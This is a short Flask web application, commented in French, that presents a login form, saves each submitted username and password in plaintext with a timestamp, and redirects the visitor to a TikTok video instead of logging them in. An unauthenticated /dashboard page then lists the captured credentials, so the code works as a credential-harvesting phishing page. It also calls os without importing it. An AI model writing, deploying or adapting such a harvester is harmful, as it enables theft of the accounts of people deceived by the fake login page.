from flask import Flask, render_template, request, redirect, url_for
from datetime import datetime

app = Flask(__name__)

# Liste pour stocker les données de test
events = []

@app.route("/")
def index():
    return redirect(url_for('login'))

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        
        # Enregistrement des données dans le "dashboard" (la liste)
        events.append({
            "username": username,
            "password": password,
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "Test effectué"
        })
        
        # Redirection vers la page vidéo au lieu du dashboard
        return redirect("https://vt.tiktok.com/ZSb7CRYxs/")
        
    return render_template("login.html")



@app.route("/dashboard")
def dashboard():
    # Dashboard totalement isolé et sécurisé (accessible uniquement via cette URL)
    return render_template("dashboard.html", events=events)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5001))
    app.run(host="0.0.0.0", port=port)
